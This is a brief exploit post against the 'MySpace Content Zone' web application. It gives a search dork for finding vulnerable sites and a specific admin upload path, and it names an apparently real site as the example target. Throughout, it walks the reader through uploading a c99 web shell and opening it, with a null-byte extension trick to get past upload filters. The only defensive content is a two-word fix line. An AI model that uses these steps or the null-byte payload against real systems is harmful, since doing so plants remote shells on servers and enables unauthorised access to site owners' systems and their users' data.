Vuln file: /admin/uploadgames.php
Fix: secure admin area

Dork: "Powered by MySpace Content Zone"


go to /admin/uploadgames.php
example:
http://www.virtualdynamite.com/admin/uploadgames.php
and upload your shell - lets say it is named as c99.php

ok, now go to /uploads/thumb/c99.php
like: http://www.virtualdynamite.com/uploads/flash/c99.php

and - what you see ?? :xD
your shell!

Note1: you can add .php%00.jpeg cause %00 = null
Note2: it takes awhile to upload a shell sometimes!
